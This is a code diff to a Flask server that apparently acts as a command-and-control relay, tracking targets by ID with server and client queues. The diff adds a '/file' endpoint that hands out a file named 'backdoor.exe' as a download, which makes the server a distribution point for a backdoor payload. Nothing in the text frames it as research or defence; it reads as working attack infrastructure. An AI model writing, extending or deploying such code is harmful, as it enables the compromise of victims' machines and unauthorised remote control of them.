@@ -1,5 +1,6 @@
-from flask import Flask, Response, request, jsonify
+from flask import Flask, Response, jsonify, send_file, request
 from werkzeug.middleware.proxy_fix import ProxyFix
+import os
 
 app = Flask(__name__)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
@@ -60,3 +61,15 @@ def bye(target_id):
     server_queues.pop(target_id, None)
     client_queues.pop(target_id, None)
     return ''
+
+@app.route('/file')
+def file():
+    try:
+        file_path = os.path.join('dist', "backdoor.exe")
+
+        if os.path.isfile(file_path):
+            return send_file(file_path, as_attachment=True, download_name="backdoor.exe")
+        else:
+            return "File not found.", 404
+    except Exception as e:
+        return str(e), 500
